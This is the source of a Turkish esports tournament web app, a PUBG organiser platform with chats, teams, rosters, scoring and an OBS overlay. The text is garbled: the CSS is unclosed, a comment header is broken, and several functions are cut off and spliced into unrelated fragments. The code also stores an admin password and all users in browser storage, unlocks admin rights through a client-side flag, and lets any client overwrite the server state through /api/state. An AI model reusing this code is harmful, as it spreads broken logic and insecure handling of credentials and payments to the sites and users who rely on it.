<style>
  :root, [data-theme="dark"] {
    --bg-main: #090D16;
    --bg-card: #111827;
    --bg-elevated: #162033;
    --bg-input: #0D1320;

    --text: #F4F7FB;

    --shadow: 0 14px 36px rgba(0, 0, 0, 0.45);
    --ease-smooth: cubic-bezier(0.22, 1, 0.36, 1);
  }

  [data-theme="light"] {
    --bg-main: #F3F6FA;
    --bg-card: #FFFFFF;
    --bg-elevated: #E8EEF6;
    --bg-input: #F8FAFC;

    --accent: #00E5FF;
    --accent-hover: #00B8D4;
    --accent-soft: rgba(0, 229, 255, 0.14);
    --accent-glow: rgba(0, 229, 255, 0.25);
    --accent-contrast: #061018;
  }

  [data-accent="emerald"] {
    --accent: #10B981;
    --accent-hover: #059669;
    --accent-soft: rgba(16, 185, 129, 0.15);
    --accent-glow: rgba(16, 185, 129, 0.25);
    --accent-contrast: #04150E;
  }

  [data-accent="violet"] {
    --accent: #8B5CF6;
    --accent-hover: #7C3AED;
    --accent-soft: rgba(139, 92, 246, 0.16);
    --accent-glow: rgba(139, 92, 246, 0.28);
    --accent-contrast: #FFFFFF;
  }

  [data-accent="amber"] {
    --accent: #F59E0B;
    --accent-hover: #D97706;
    --accent-soft: rgba(245, 158, 11, 0.16);
    --accent-glow: rgba(245, 158, 11, 0.26);
    --accent-contrast: #140D02;

    --accent-soft: rgba(244, 63, 94, 0.15);
    --accent-glow: rgba(244, 63, 94, 0.26);

    --accent: #0284C7;
    --accent-hover: #0369A1;
    --accent-soft: rgba(2, 132, 199, 0.12);
    --accent-glow: rgba(2, 132, 199, 0.2);
    --accent-contrast: #FFFFFF;

  * { box-sizing: border-box; }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    background-color: var(--bg-main);
    color: var(--text);
    transition: background-color 0.25s var(--ease-smooth), color 0.25s var(--ease-smooth);
    overflow-x: hidden;
  }

  .theme-card {
    background-color: var(--bg-card);
    border: 1px solid var(--border);
    box-shadow: var(--shadow);
    transition: transform 0.22s var(--ease-smooth), border-color 0.22s var(--ease-smooth), background-color 0.22s var(--ease-smooth);
  }

  .theme-card-hover:hover {
    border-color: var(--accent);
    transform: translateY(-2px);
  }

  .theme-elevated {
    background-color: var(--bg-elevated);
    border: 1px solid var(--border);
  }

  .theme-input {
    background-color: var(--bg-input);
    border: 1px solid var(--border);
    color: var(--text);
    transition: border-color 0.2s var(--ease-smooth), box-shadow 0.2s var(--ease-smooth);
  }

  .theme-input:focus {
    outline: none;
    border-color: var(--accent);
    box-shadow: 0 0 0 3px var(--accent-soft);
  }

  .btn-accent {
    background-color: var(--accent);
    color: var(--accent-contrast);
    font-weight: 700;
    box-shadow: 0 6px 18px var(--accent-glow);
    transition: all 0.2s var(--ease-smooth);
  }

  .btn-accent:hover:not(:disabled) {
    background-color: var(--accent-hover);
    transform: translateY(-1px);
  }

  .btn-accent:active:not(:disabled) {
    transform: scale(0.98);
  }

  .btn-ghost {
    background-color: var(--bg-elevated);
    border: 1px solid var(--border);
    color: var(--text);
    transition: all 0.2s var(--ease-smooth);
  }

  .btn-ghost:hover:not(:disabled) {
    border-color: var(--accent);
    color: var(--accent);
    transform: translateY(-1px);
  }

  .accent-text { color: var(--accent); }
  .accent-bg-soft { background-color: var(--accent-soft); color: var(--accent); }
  .accent-border { border-color: var(--accent) !important; }
  .muted-text { color: var(--text-muted); }

  /* 3-Column Mathematically Centered Header Grid */
  .nav-grid-3col {
    display: grid;
    grid-template-columns: 1fr auto 1fr;
    align-items: center;
  }

  @media (max-width: 767px) {
    .nav-grid-3col {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
  }

  @keyframes pageFadeUp {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  @keyframes chatSwitchIn {
    0% { opacity: 0; transform: translateX(24px) scale(0.98); }
    100% { opacity: 1; transform: translateX(0) scale(1); }
  }

  @keyframes modalScaleIn {
    from { opacity: 0; transform: scale(0.95) translateY(8px); }
    to { opacity: 1; transform: scale(1) translateY(0); }
  }

  @keyframes drawerSlideIn {
    from { transform: translateX(100%); opacity: 0.4; }
    to { transform: translateX(0); opacity: 1; }
  }

  @keyframes pulseIdWarn {
    0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.35); border-color: #F59E0B; }
    50% { box-shadow: 0 0 0 6px rgba(245, 158, 11, 0); border-color: #FBBF24; }
  }

  .animate-page { animation: pageFadeUp 0.28s var(--ease-smooth); }
  .animate-chat-switch { animation: chatSwitchIn 0.3s var(--ease-smooth); }
  .animate-modal { animation: modalScaleIn 0.22s var(--ease-smooth); }
  .animate-drawer { animation: drawerSlideIn 0.26s var(--ease-smooth); }
  .animate-id-warn { animation: pulseIdWarn 1.5s infinite; }

  ::-webkit-scrollbar { width: 6px; height: 6px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 999px; }
  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }

/* ============================================================================
   2. CLEAN ZERO-START STATE & REAL-TIME SYNC (BroadcastChannel + storage + 2.5s)
   ============================================================================ */
function createCleanZeroState() {
  return {
    siteLogoUrl: DEFAULT_LOGO_DATA_URL,
    siteIconUrl: DEFAULT_LOGO_DATA_URL,
    ibanSettings: {
      bankName: 'Ziraat Bankası',
      iban: 'TR07 0015 7000 0000 0096 8623 49',
      holderName: 'NVL Games Spor Organizasyon'
    },
    users: [
      {
        id: 'u_admin_default',
        username: ADMIN_LOGIN_ID,
        password: ADMIN_LOGIN_PASS,
        name: 'NVL Admin',
        email: 'admin@nvlgames.com.tr',
        role: 'admin',
        isAdmin: true,
        canCreateTournament: true,
        balance: 0,
        followers: [],
        following: []
      }
    ],
    announcements: [],
    teams: [],
    tournaments: [],
    forumMessages: [],
    tournamentChats: {},
    teamChats: {},
    dmMessages: [],
    payments: [],
    updatedAt: 0
  };
}

function normalizeState(rawObj) {
  const base = createCleanZeroState();
  if (!rawObj || typeof rawObj !== 'object') return base;
  const users = Array.isArray(rawObj.users) ? rawObj.users : [];
  if (!users.some(u => u.username === ADMIN_LOGIN_ID)) {
    users.unshift(base.users[0]);
  }
  return {
    ...base,
    ...rawObj,
    siteLogoUrl: rawObj.siteLogoUrl || DEFAULT_LOGO_DATA_URL,
    siteIconUrl: rawObj.siteIconUrl || rawObj.siteLogoUrl || DEFAULT_LOGO_DATA_URL,
    ibanSettings: { ...base.ibanSettings, ...(rawObj.ibanSettings || {}) },
    users,
    announcements: Array.isArray(rawObj.announcements) ? rawObj.announcements : [],
    teams: Array.isArray(rawObj.teams) ? rawObj.teams : [],
    tournaments: Array.isArray(rawObj.tournaments) ? rawObj.tournaments : [],
    forumMessages: Array.isArray(rawObj.forumMessages) ? rawObj.forumMessages : [],
    tournamentChats: rawObj.tournamentChats && typeof rawObj.tournamentChats === 'object' ? rawObj.tournamentChats : {},
    teamChats: rawObj.teamChats && typeof rawObj.teamChats === 'object' ? rawObj.teamChats : {},
    dmMessages: Array.isArray(rawObj.dmMessages) ? rawObj.dmMessages : [],
    payments: Array.isArray(rawObj.payments) ? rawObj.payments : []
  };
}

function loadStateFromStorage() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return createCleanZeroState();
    return normalizeState(JSON.parse(raw));
  } catch {
    return createCleanZeroState();
  }
}

function loadSessionFromStorage() {
  const defaults = {
    theme: 'dark',
    accent: 'cyan',
    lang: 'tr',
    currentUsername: null,
    adminUnlocked: false
  };
  try {
    const raw = sessionStorage.getItem(SESSION_KEY) || localStorage.getItem(SESSION_KEY);
    if (!raw) return defaults;
    const p = JSON.parse(raw);
    return {
      theme: p.theme === 'light' ? 'light' : 'dark',
      accent: ACCENT_PRESETS.some(x => x.id === p.accent) ? p.accent : 'cyan',
      lang: p.lang === 'en' ? 'en' : 'tr',
      currentUsername: p.currentUsername || null,
      adminUnlocked: !!p.adminUnlocked
    };
  } catch {
    return defaults;
  }
}

// Durumun "parmak izi" (updatedAt haric). Icerik ayni mi diye karsilastirmak icin.
function stateSignature(s) {
  try {
    return JSON.stringify(s, (k, v) => (k === 'updatedAt' ? undefined : v));
  } catch { return Math.random().toString(); }
}

// Gelen durumu uygula: SADECE icerik gercekten degistiyse yeniden ciz.
// Bu, her 2 saniyede bir gereksiz yeniden cizimi (ekranin titremesini) onler.
function applyIncomingState(rawState, persist) {
  try {
    const incoming = normalizeState(rawState);
    if (stateSignature(incoming) === stateSignature(appData)) return false;
    appData = incoming;
    if (persist) {
      try { localStorage.setItem(STORAGE_KEY, JSON.stringify(appData)); } catch {}
    }
    renderApp(true);
    return true;
  } catch { return false; }
}

let syncChannel = null;
try {
  if (typeof BroadcastChannel !== 'undefined') {
    syncChannel = new BroadcastChannel(CHANNEL_NAME);
    syncChannel.onmessage = (ev) => {
      if (ev?.data?.type === 'STATE_SYNC' && ev.data.state) {
        applyIncomingState(ev.data.state, true);
      }
    };
  }
} catch {}

window.addEventListener('storage', (ev) => {
  if (ev.key === STORAGE_KEY && ev.newValue) {
    try { applyIncomingState(JSON.parse(ev.newValue), false); } catch {}
  }
});

function persistSession() {
  try { sessionStorage.setItem(SESSION_KEY, JSON.stringify(session)); } catch {}
  try { localStorage.setItem(SESSION_KEY, JSON.stringify(session)); } catch {}
}

async function saveState(mutatorFn) {
  try {
    const draft = JSON.parse(JSON.stringify(appData));
    if (typeof mutatorFn === 'function') mutatorFn(draft);
    draft.updatedAt = Date.now();
    appData = normalizeState(draft);
    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(appData)); } catch {}
    if (syncChannel) {
      try { syncChannel.postMessage({ type: 'STATE_SYNC', state: appData }); } catch {}
    }
    renderApp(true);

    try {
      await fetch('/api/state', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: appData })
      });
    } catch {}
  } catch (err) {
    console.error('saveState error:', err);
  }
}

async function pullRemoteState() {
  try {
    const res = await fetch('/api/state', { cache: 'no-store' });
    if (!res.ok) return;
    const payload = await res.json();
    if (payload && payload.state && typeof payload.state === 'object') {
      applyIncomingState(payload.state, true);
    }
  } catch {}
}

setInterval(() => {
  if (!document.hidden) pullRemoteState();
}, 2000);

/* ============================================================================
   3. DEDICATED SEPARATE #admin ROUTE CHECK
   ============================================================================ */
function checkRouteFromLocation() {
  try {
    const rawHash = String(window.location.hash || '');
    const hash = rawHash.toLowerCase();
    const params = new URLSearchParams(window.location.search);
    if (hash === '#admin' || hash.startsWith('#admin/') || params.get('page') === 'admin') {
      activeView = 'admin';
    }
    // OBS yayin overlay'i: #obs/<turnuvaId>  (OBS Tarayici Kaynagi icin)
    if (hash === '#obs' || hash.startsWith('#obs/') || params.get('page') === 'obs') {
      activeView = 'obs';
      const parts = rawHash.split('/');
      if (parts[1]) activeTournamentId = parts[1];
      else if (params.get('t')) activeTournamentId = params.get('t');
    }
  } catch {}
}

window.addEventListener('hashchange', () => {
  checkRouteFromLocation();
  renderApp(false);
});

   ============================================================================ */
function t(key) {
  const code = session.lang === 'en' ? 'en' : 'tr';
  return (I18N[code] && I18N[code][key]) || I18N.tr[key] || key;
}

function getCurrentUser() {
  if (!session.currentUsername) return null;
  return appData.users.find(u => u.username === session.currentUsername) || null;
}

function getPublicUsers() {
  return (appData.users || []).filter(u => u.username !== ADMIN_LOGIN_ID && u.role !== 'admin');
}

function getUserTeam(username) {
  if (!username) return null;
  return appData.teams.find(tm =>
    tm.ownerUsername === username ||
    (tm.mainPlayers || []).some(p => (typeof p === 'string' ? p === username : p.username === username))
  ) || null;
}

function showToast(msg) {
  const el = document.getElementById('toastEl');
  if (!el) return;
  el.textContent = msg;
  el.classList.remove('opacity-0', 'translate-y-4');
  el.classList.add('opacity-100', 'translate-y-0');
  clearTimeout(window._nvlToastTimer);
  window._nvlToastTimer = setTimeout(() => {
    el.classList.add('opacity-0', 'translate-y-4');
    el.classList.remove('opacity-100', 'translate-y-0');
  }, 2800);
}

function escapeHtml(val) {
  return String(val ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

function escapeAttr(val) {
  return escapeHtml(val).replaceAll('`', '&#96;');
}

function copyText(text, toastMsg) {
  const v = String(text || '');
  try {
    const ta = document.createElement('textarea');
    ta.value = v;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  } catch {}
  showToast(toastMsg || 'Kopyalandı!');
}

function applyDynamicFavicon() {

function pushSystemMessage(draft, username, text) {
  const timeStr = new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
  draft.dmMessages = draft.dmMessages || [];
  draft.dmMessages.push({
    id: 'dm_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
    from: 'nvl_sistem',
    to: username,
    text: `[NVL Sistem] ${text}`,
    time: timeStr,
    read: false
  });
}

function getUnreadDmCount() {
  const u = getCurrentUser();
  if (!u) return 0;
  return (appData.dmMessages || []).filter(m => m.to === u.username && !m.read).length;
}

function calcPlacementPts(rank) {
  const r = Number(rank);
  // 1.=10, 2.=8, 3.=6, 4.=4, 5.=2, 6.=1, 7. ve sonrasi=0
  const map = { 1: 10, 2: 8, 3: 6, 4: 4, 5: 2, 6: 1 };
  return map[r] || 0;
}

function computeTournamentStandings(tour) {
  const scores = tour.matchScores || {};
  const joined = tour.joinedTeams || [];
  const rows = joined.map(tid => {
    const tm = appData.teams.find(x => x.id === tid);
    let placePts = 0;
    let kills = 0;
    for (let m = 1; m <= Number(tour.matches || 1); m++) {
      const s = scores[m]?.[tid];
      if (s && (s.rank !== '' || s.kills !== '')) {
        placePts += calcPlacementPts(s.rank);
        kills += Number(s.kills || 0);
      }
    }
    return {
      teamId: tid,
      teamName: tm ? tm.name : tid,
      tag: tm ? tm.tag : '',
      logo: tm ? (tm.logoUrl || '') : '',
      placePts,
      kills,
      totalPts: placePts + kills
    };
  });
  return rows.sort((a, b) => b.totalPts - a.totalPts || b.kills - a.kills);
}

function computeTeamLeaderboard() {
  return appData.teams.map(tm => {
    let joinedCount = 0;
    let totalPts = 0;
    appData.tournaments.forEach(tour => {
      if ((tour.joinedTeams || []).includes(tm.id)) {
        joinedCount++;
        const scores = tour.matchScores || {};
        for (let m = 1; m <= Number(tour.matches || 1); m++) {
          const s = scores[m]?.[tm.id];
          if (s) totalPts += calcPlacementPts(s.rank) + Number(s.kills || 0);
        }
      }
    });
    return { ...tm, joinedCount, totalPts };
  }).sort((a, b) => b.joinedCount - a.joinedCount || b.totalPts - a.totalPts || a.name.localeCompare(b.name));
}

function canAccessTournamentChat(tour) {
  const u = getCurrentUser();
  if (!u || !tour) return false;
  if (u.isAdmin || session.adminUnlocked || tour.creator === u.username) return true;
  const myTeam = getUserTeam(u.username);
  return !!(myTeam && (tour.joinedTeams || []).includes(myTeam.id));
}

// --- Turnuva kadro / kilit yardimcilari ---
function parseTourStart(tour) {
  try {
    if (!tour || !tour.date) return null;
    const d = new Date(`${tour.date}T${tour.time || '00:00'}:00`);
    return isNaN(d.getTime()) ? null : d;
  } catch { return null; }
}
function isRosterLocked(tour) {
  // Turnuvaya 1 saatten az kaldiysa kadro kilitlenir
  const start = parseTourStart(tour);
  if (!start) return false;
  return Date.now() >= (start.getTime() - 60 * 60 * 1000);
}
function getTournamentRoster(tour, teamId) {
  const r = (tour && tour.rosters && tour.rosters[teamId]) || {};
  const main = Array.isArray(r.main) ? r.main : [];
  const sub = Array.isArray(r.sub) ? r.sub : [];
  return {
    main: [0, 1, 2, 3].map(i => main[i] || { nick: '', id: '' }),
    sub: [0, 1].map(i => sub[i] || { nick: '', id: '' }),
    subOut: (typeof r.subOut === 'number') ? r.subOut : null,
    subIn: (typeof r.subIn === 'number') ? r.subIn : null,
    subDone: !!r.subDone
  };
}

function navigate(view, tourId = null, tab = null) {
  if (activeView === 'wallet' && view !== 'wallet') {
    walletDraft = { cardHolder: '', cardNumber: '', cardExpiry: '', cardCvv: '', senderName: '' };
  }
  activeView = view;
  if (tourId) activeTournamentId = tourId;
  if (view === 'admin') {
    try { history.replaceState(null, '', '#admin'); } catch {}
  } else if (view === 'obs') {
    try { history.replaceState(null, '', '#obs/' + (activeTournamentId || '')); } catch {}
  } else if (window.location.hash && (window.location.hash.startsWith('#admin') || window.location.hash.startsWith('#obs'))) {
    try { history.replaceState(null, '', window.location.pathname + window.location.search); } catch {}
  }
  if (tab) activeTournamentTab = tab;
  if (view === 'profile' && !activeProfileUsername && getCurrentUser()) {
    activeProfileUsername = getCurrentUser().username;
  }
  toggleDrawer(false);
  toggleDmPanel(false);
  closeModal();
  renderApp(false);
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function toggleDrawer(forceState = null) {
  isDrawerOpen = forceState === null ? !isDrawerOpen : Boolean(forceState);
  const bd = document.getElementById('drawerBackdrop');
  if (!bd) return;
  if (isDrawerOpen) {
    renderDrawerContent();
    bd.classList.remove('hidden');
    bd.classList.add('flex');
  } else {
    bd.classList.add('hidden');
    bd.classList.remove('flex');
  }
}

function toggleDmPanel(forceState = null) {
  const nextState = forceState === null ? !isDmPanelOpen : Boolean(forceState);
  if (nextState && !getCurrentUser()) {
    openAuthModal('login');
    return;
  }
  isDmPanelOpen = nextState;

    bd.classList.remove('flex');
  }
}

    if (target && !target.disabled) {
      target.focus();
      if (typeof focusSnap.start === 'number') target.setSelectionRange(focusSnap.start, focusSnap.end);
    }
  } catch {}
}

async function markPeerMessagesRead(peer) {
  const u = getCurrentUser();
  if (!u || !peer) return;
  const hasUnread = appData.dmMessages.some(m => m.to === u.username && m.from === peer && !m.read);
  if (hasUnread) {
    await saveState(draft => {
      draft.dmMessages.forEach(m => {
        if (m.to === u.username && m.from === peer) m.read = true;
      });
    });
  }
}

async function selectDmThread(peer) {
  selectedDmPeer = peer;
  dmAnimationKey++;
  await markPeerMessagesRead(peer);
  if (activeView === 'messages') renderApp(false);
  else renderDmDrawerContent();
}

async function sendDirectMessage(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u || !selectedDmPeer || selectedDmPeer === 'nvl_sistem') return;
  const inp = document.getElementById('dmMsgInput');
  const txt = String(inp?.value || '').trim();
  if (!txt) return;
  inp.value = '';
  await saveState(draft => {
    draft.dmMessages.push({
      id: 'dm_' + Date.now(),
      from: u.username,
      to: selectedDmPeer,
      text: txt,
      time: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }),
      read: false
    });
  });
}

async function sendForumChatMessage(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) { openAuthModal('login'); return; }
  const inp = document.getElementById('forumLiveInput');
  const txt = String(inp?.value || '').trim();

  await saveState(draft => {
    draft.forumMessages = draft.forumMessages || [];
    draft.forumMessages.push({
      id: 'fm_' + Date.now(),
      author: u.username,
      text: txt,
      time: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
    });
    if (draft.forumMessages.length > 200) {
      draft.forumMessages = draft.forumMessages.slice(-200);
    }
  });
}

async function requestJoinTournament(tourId) {
  const u = getCurrentUser();
  if (!u) { openAuthModal('login'); return; }
  const myTeam = getUserTeam(u.username);
  if (!myTeam) {
    showToast('Turnuvaya katılmak için önce Takımım sekmesinden takım kurun.');
    navigate('team');
    return;
  }
  const tour = appData.tournaments.find(t => t.id === tourId);
  if (!tour) return;
  if ((tour.pendingTeams || []).includes(myTeam.id) || (tour.joinedTeams || []).includes(myTeam.id)) return;

  // Oda kodu + sifreli turnuvalar: takimda en az 4 oyuncu zorunlu.
  // Arkadas eklemeli (oda kodsuz) turnuvalar: takim olmasi yeterli.
  if (tour.isRoomCoded && (myTeam.mainPlayers || []).length < 4) {
    showToast('Bu turnuvaya katılmak için takımınızda en az 4 oyuncu olmalı (davet koduyla oyuncu ekleyin).');
    return;
  }

  if (Number(tour.entryFee) > 0 && Number(u.balance || 0) < Number(tour.entryFee)) {
    showToast(`Yetersiz N bakiyesi. Gerekli: ${tour.entryFee} N`);
    return;
  }

  await saveState(draft => {
    const tr = draft.tournaments.find(x => x.id === tourId);
    if (!tr) return;
    tr.pendingTeams = tr.pendingTeams || [];
    tr.pendingTeams.push(myTeam.id);
    pushSystemMessage(draft, tr.creator, `"${tr.title}" turnuvasına "${myTeam.name}" takımından katılım isteği geldi.`);
  });
  showToast('Katılma isteği organizatöre gönderildi!');
}

async function toggleTournamentChatLock(tourId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(x => x.id === tourId);
    if (tr) tr.chatLocked = !tr.chatLocked;
  });
  showToast('Turnuva sohbet kilidi güncellendi.');
}

async function sendTournamentChat(e, tourId) {
  e.preventDefault();
  const u = getCurrentUser();
  const tour = appData.tournaments.find(t => t.id === tourId);
  if (!u || !tour || !canAccessTournamentChat(tour)) return;
  const isOrg = u.username === tour.creator || u.isAdmin || session.adminUnlocked;
  if (tour.chatLocked && !isOrg) return;

  const inp = document.getElementById('tourChatMsgInp');
  const txt = String(inp?.value || '').trim();
  if (!txt) return;
  inp.value = '';

  await saveState(draft => {
    draft.tournamentChats[tourId] = draft.tournamentChats[tourId] || [];
    draft.tournamentChats[tourId].push({
      author: u.username,
      text: txt,
      time: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
    });
  });
}

async function createNewTournament(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  const fd = new FormData(e.target);
  const isRoomCoded = fd.get('isRoomCoded') === 'on';
  const tr = {
    id: 'tr_' + Date.now(),
    title: String(fd.get('title') || '').trim(),
    mode: String(fd.get('mode') || 'SQUAD'),
    map: String(fd.get('map') || 'Erangel'),
    creator: u.username,
    matches: Number(fd.get('matches') || 4),
    entryFee: Number(fd.get('entryFee') || 0),
    prizePool: String(fd.get('prizePool') || '0 N').trim(),
    date: String(fd.get('date') || ''),
    time: String(fd.get('time') || ''),
    isRoomCoded,
    roomCode: isRoomCoded ? String(fd.get('roomCode') || '').trim() : '',
    roomPassword: isRoomCoded ? String(fd.get('roomPassword') || '').trim() : '',
    description: String(fd.get('description') || '').trim(),
    rules: String(fd.get('rules') || '').trim(),
    pendingTeams: [],
    joinedTeams: [],
    matchScores: {},
    maps: {},
    chatLocked: false,
    status: 'open'
  };
  // Her maca varsayilan haritayi ata (sonradan tek tek degistirilebilir)
  const matchCount = Number(fd.get('matches') || 4);
  const defaultMap = String(fd.get('map') || 'Erangel');
  for (let i = 1; i <= matchCount; i++) tr.maps[i] = defaultMap;
  selectedOrganizerTourId = tr.id;
  await saveState(draft => { draft.tournaments.unshift(tr); });
  showToast('Turnuva başarıyla yayınlandı!');
}

async function updateOrganizerTourDetails(e, tourId) {
  e.preventDefault();
  const fd = new FormData(e.target);
  const isRoomCoded = fd.get('isRoomCoded') === 'on';
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (!tr) return;
    tr.isRoomCoded = isRoomCoded;
    tr.roomCode = isRoomCoded ? String(fd.get('roomCode') || '').trim() : '';
    tr.roomPassword = isRoomCoded ? String(fd.get('roomPassword') || '').trim() : '';
    tr.description = String(fd.get('description') || '').trim();
    tr.rules = String(fd.get('rules') || '').trim();
  });
  showToast('Turnuva bilgileri güncellendi.');
}

async function approveTeamSlot(tourId, teamId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    const tm = draft.teams.find(t => t.id === teamId);
    if (!tr || !tm) return;
    if ((tr.joinedTeams || []).length >= 23) return;
    tr.pendingTeams = (tr.pendingTeams || []).filter(id => id !== teamId);
    tr.joinedTeams = tr.joinedTeams || [];
    if (!tr.joinedTeams.includes(teamId)) {
      tr.joinedTeams.push(teamId);
      const assignedSlot = tr.joinedTeams.length + 2;
      pushSystemMessage(draft, tm.ownerUsername, `"${tr.title}" turnuvasına onaylandınız! Slot numaranız: Slot #${assignedSlot}`);
    }
  });
  showToast('Takım onaylandı ve Slot 3–25 aralığına yerleştirildi!');
}

async function rejectTeamSlot(tourId, teamId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (tr) tr.pendingTeams = (tr.pendingTeams || []).filter(id => id !== teamId);
  });
  showToast('Başvuru reddedildi.');
}

async function setMatchMap(tourId, matchNo, mapName) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (!tr) return;
    tr.maps = tr.maps || {};
    tr.maps[matchNo] = mapName;
  });
  showToast(`Maç #${matchNo} haritası: ${mapName}`);
}

async function saveTournamentMatchScores(e, tourId, matchNo) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (!tr) return;
    tr.matchScores = tr.matchScores || {};
    tr.matchScores[matchNo] = {};
    (tr.joinedTeams || []).forEach(tid => {
      const r = fd.get(`rank_${tid}`);
      const k = fd.get(`kills_${tid}`);
      tr.matchScores[matchNo][tid] = {
        rank: r === '' ? '' : Number(r),
        kills: k === '' ? '' : Number(k)
      };
    });
  });
  showToast(`Maç #${matchNo} skorları kaydedildi.`);
}

function copyObsLink(tourId) {
  const link = location.origin + location.pathname + '#obs/' + tourId;
  copyText(link, 'OBS yayın linki kopyalandı! OBS → Kaynaklar → Tarayıcı olarak yapıştırın.');
}

async function saveTournamentRoster(e, tourId, teamId) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (!tr) return;
    if (isRosterLocked(tr) || tr.status === 'completed' || tr.status === 'live') return;
    tr.rosters = tr.rosters || {};
    tr.rosters[teamId] = tr.rosters[teamId] || {};
    tr.rosters[teamId].main = [0, 1, 2, 3].map(i => ({
      nick: String(fd.get(`m_nick_${i}`) || '').trim(),
      id: String(fd.get(`m_id_${i}`) || '').trim()
    }));
    tr.rosters[teamId].sub = [0, 1].map(i => ({
      nick: String(fd.get(`s_nick_${i}`) || '').trim(),
      id: String(fd.get(`s_id_${i}`) || '').trim()
    }));
  });
  showToast('Kadro kaydedildi.');
}

async function requestSubstitution(e, tourId, teamId) {
  e.preventDefault();
  const fd = new FormData(e.target);
  const out = fd.get('subOut');
  const inp = fd.get('subIn');
  if (out === '' || inp === '' || out == null || inp == null) {
    showToast('Çıkan ve giren oyuncuyu seçin.');
    return;
  }
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (!tr) return;
    tr.rosters = tr.rosters || {};
    tr.rosters[teamId] = tr.rosters[teamId] || {};
    tr.rosters[teamId].subOut = Number(out);
    tr.rosters[teamId].subIn = Number(inp);
    tr.rosters[teamId].subDone = false;
    const tm = draft.teams.find(x => x.id === teamId);
    pushSystemMessage(draft, tr.creator, `"${tr.title}" — "${tm ? tm.name : teamId}" takımı yedek değişimi talep etti.`);
  });
  showToast('Yedek değişim talebi organizatöre iletildi.');
}

async function markSubstitutionDone(tourId, teamId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (tr && tr.rosters && tr.rosters[teamId]) tr.rosters[teamId].subDone = true;
  });
  showToast('Değişim tamamlandı olarak işaretlendi.');
}

async function startTournamentLive(tourId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (tr) tr.status = 'live';
  });
  showToast('Turnuva CANLI olarak başlatıldı! Oyuncular yedek değişimi yapabilir.');
}

async function finishTournamentNow(tourId) {
  await saveState(draft => {
    const tr = draft.tournaments.find(t => t.id === tourId);
    if (tr) tr.status = 'completed';
  });
  showToast('Turnuva tamamlandı ve Result tablosu yayınlandı!');
}

async function createUserTeam(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  if (u.canCreateTournament || u.isAdmin) {
    showToast('Organizatör yetkisine sahip hesaplar takım kuramaz.');
    return;
  }
  const fd = new FormData(e.target);
  const code = 'NVL-' + Math.floor(1000 + Math.random() * 9000);
  await saveState(draft => {
    draft.teams.push({
      id: 'tm_' + Date.now(),
      ownerUsername: u.username,
      name: String(fd.get('name') || '').trim(),
      tag: String(fd.get('tag') || '').trim().toUpperCase(),
      logoUrl: '',
      inviteCode: code,
      mainPlayers: [u.username],
      mainRoster: [
        { label: 'Ana Oyuncu 1 (Kaptan)', nick: u.pubgName || u.username, pubgId: u.pubgId || '' },
        { label: 'Ana Oyuncu 2', nick: '', pubgId: '' },
        { label: 'Ana Oyuncu 3', nick: '', pubgId: '' },
        { label: 'Ana Oyuncu 4', nick: '', pubgId: '' }
      ],
      subRoster: [
        { label: 'Yedek Oyuncu 1', nick: '', pubgId: '' },
        { label: 'Yedek Oyuncu 2', nick: '', pubgId: '' }
      ]
    });
  });
  showToast(`Takım kuruldu! Davet kodunuz: ${code}`);
}

function uploadTeamLogoFile(e, teamId) {
  const file = e.target.files?.[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = async () => {
    await saveState(draft => {
      const tm = draft.teams.find(x => x.id === teamId);
      if (tm) tm.logoUrl = String(reader.result || '');
    });
    showToast('Takım logosu güncellendi!');
  };
  reader.readAsDataURL(file);
}

async function saveTeamRosterIds(e, teamId) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await saveState(draft => {
    const tm = draft.teams.find(x => x.id === teamId);
    if (!tm) return;
    tm.mainRoster = [0, 1, 2, 3].map(i => ({
      label: i === 0 ? 'Ana Oyuncu 1 (Kaptan)' : `Ana Oyuncu ${i + 1}`,
      nick: String(fd.get(`main_nick_${i}`) || '').trim(),
      pubgId: String(fd.get(`main_id_${i}`) || '').trim()
    }));
    tm.subRoster = [0, 1].map(i => ({
      label: `Yedek Oyuncu ${i + 1}`,
